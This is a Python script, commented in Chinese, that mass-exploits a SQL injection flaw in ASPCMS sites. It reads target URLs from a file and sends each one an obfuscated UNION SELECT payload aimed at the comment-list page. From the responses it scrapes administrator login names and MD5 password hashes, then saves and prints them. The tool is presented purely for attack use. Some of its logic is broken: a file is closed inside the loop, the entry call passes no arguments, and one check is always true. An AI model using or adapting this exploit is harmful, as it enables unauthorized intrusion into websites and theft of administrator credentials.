from bs4 import BeautifulSoup as bs
import requests
import hashlib
from urllib.parse import urljoin
import re

def ASPCMS_EXP(input_file,output_file):
    f = open(input_file, "r")  # 打开我们刚刚收集的文本文档
    url = f.readlines()  # 逐行取出我们的链接
    for i in url:  # 将取出的链接放入循环中
        i2=urljoin(i.strip(),"/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user")
        try:  # 加入异常处理，让报错直接忽略，不影响程序运行
            r = requests.get(i2, timeout=4)  # 请求网址并进行超时判断
            if r.status_code==200:#判断网址是否可以正常打开
                soup=bs(r.text,"lxml")   #用bs解析网站
                if hashlib.md5:   #判断网址中是否有MD5，如果有则继续运行
                    mb1=soup.find_all(name="div",attrs={"class":"line1"})[0].text #获取line11数据
                    mb2=soup.find_all(name="div",attrs={"class":"line2"})[0].text #获取line2数据
                    f2=open(output_file,'a+')   #打开我们的文本
                    f2.write(i+"用户名是： "+mb1+"MD5值是： "+mb2+"\n")     #将我们验证好的链接，还有数据保存在文本中
                    f2.close()
                    m1 = str(re.findall(".*者(.*)IP.*",mb1))
                    m1=str(re.findall('[a-zA-Z]+',m1))
                    print(i.strip()+"网站的后台登录名和密码是：")
                    print(m1,mb2)

        except:
            pass

        f.close()    #关闭之前收集到的网址


if __name__=='__main__':
    ASPCMS_EXP()

